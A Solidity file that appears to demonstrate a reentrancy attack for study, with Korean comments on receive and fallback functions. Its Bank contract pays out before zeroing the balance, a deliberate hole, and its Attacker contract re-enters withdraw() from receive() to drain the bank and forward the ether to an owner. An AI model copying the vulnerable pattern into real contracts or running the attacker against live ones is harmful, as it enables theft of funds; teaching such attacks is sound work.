//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Bank {
	mapping(address => uint) public balances;
	
    constructor() payable {

    }

	function deposit() external payable {
		balances[msg.sender] += msg.value;
	}

	function withdraw() external {
		uint currentBalance = balances[msg.sender];
		(bool result,) = msg.sender.call{value:currentBalance}("");
		require(result, "ERROR");

		balances[msg.sender] = 0;
	}

    function checkBalance() external view returns(uint) {
		return address(this).balance;
	}
}


contract Attacker {
	
    event Info(string info);
	Bank public bank;
    address public owner;

	constructor(address _bank, address _owner) {
		// 기존의 Bank 주소를 사용할 수 있게 됨
		bank = Bank(_bank);
        owner = _owner;
	}

    // fallback 함수와 비슷하지만 receive는 순수하게 이더만 받을 때 작동
    // fallback : 함수를 실행하면서 이더를 보낼때, 불려진 함수가 없을 떄 작동
    receive() payable external {
        // msg.sender : Bank의 주소
        if(address(msg.sender).balance > 0) {
            bank.withdraw();
        } else {
            emit Info("Thank you for your ether :)");
        }
    }

	function sendEther() external payable {
		bank.deposit{value:msg.value}();
	}

	function withdrawEther() external {
		bank.withdraw();
	}

	function checkBalance() external view returns(uint) {
		return address(this).balance;
	}

    function giveMeEther() external {
        (bool result,) = owner.call{value:address(this).balance} ("");
        require(result, "ERROR");
    }
}